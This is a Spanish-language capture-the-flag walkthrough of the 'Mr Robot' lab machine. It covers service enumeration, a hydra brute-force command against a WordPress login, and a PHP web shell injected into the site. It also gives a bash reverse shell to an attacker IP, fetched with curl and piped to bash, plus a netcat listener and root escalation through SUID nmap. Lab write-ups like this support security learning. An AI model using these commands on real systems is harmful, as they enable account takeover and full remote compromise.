
# MR Robot Room

## Detalles de vulnerabilidades
- Se enumeran los servicios de la maquina y se obtiene la siguiente información
    - Servicio SSH en el puerto 22
    - Servicio http con Apache en el puerto 80
    - Servicio http con Apache en el puerto 443
- Se enumeran las rutas ocultas haciendo uso de `gobuster`
- Se encuentra el archivo de `robots.txt`
- El archivo de `robots.txt` contenia una flag y una `wordlist`
- Se reduce el tamaño de la `wordlist` eliminando palabras repetidas.
- Se encuentra una pagina de login que hace uso de `wordpress`.
- bajo un analisis de `nikto` se detecta que la pagina es vulnerable al acceso mediante fuerza bruta
- Se usa `hydra` para obtener las credenciales del usuario de Elliot usando la nueva `wordlist` filtrada.
- se obtiene las credenciales de Elliot y se accede a la página de administración de `wordpress`
- Se altera una ruta que hace uso de `php` y se inyecta código malicioso para poder generar una `reverse tcp shell`
- Se encuentra que `nmap` tiene permisos especiales, a partir de ello se puede obtener una shell con privilegios


## Comandos o código utilizado
Conociendo de nombre de usuario a Elliot, dado que el login es vulnerable a fuerza bruta se hace uso de Hydra para obtener las credenciales.
> `sudo hydra -l Elliot -P ~/new_dsocity.dic 10.10.55.47 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username"`

Modificar los archivos de php existentes y agregar una de las siguientes opciones

**OPCIÓN 1**
> Agregar payload completo para crear una reverse shell: https://github.com/Wh1ter0sEo4/reverse_shell_php/blob/main/reverse_shell.php
 
**FIN OPCIÓN** 

**OPCIÓN 2**
Agregar la siguiente linea y proceder a ejecutar los comandos desde la URL
> `echo '<?php system($_GET["cmd"]); ?>' > shell.php`

Crear archivo `shell.sh` para ejecutar el `Reverse TCP Shell`
```
#!/bin/bash
bash -i >& /dev/tcp/<IP-ATACANTE>/4444 0>&1  
```
Hospedar archivo `shell.sh`
> `python -m http.server 8001`

Escuchar por conexiones
> `nc -nvlp 4444`

Navegador al siguiente url:
> `http://<DOMINIO/HOST>/<RUTA>/shell.php?cmd=curl <IP-ATACANTE>:8001/shell.sh|bash`

**FIN OPCIÓN** 

Estabilizar la Shell 
> `python -c 'import pty;pty.spawn("/bin/bash")'`

Mas información para Estabilizar la Shell 
> https://brain2life.hashnode.dev/how-to-stabilize-a-simple-reverse-shell-to-a-fully-interactive-terminal

Encontrar archivos con permisos especiales
> `find / -perm +6000 2>/dev/null | grep '/bin/'`

Escalar privilegios con nmap con permisos especiales
```
nmap --interactive
nmap> !sh
```
Recurso para escalación de privilegios
> https://gtfobins.github.io/
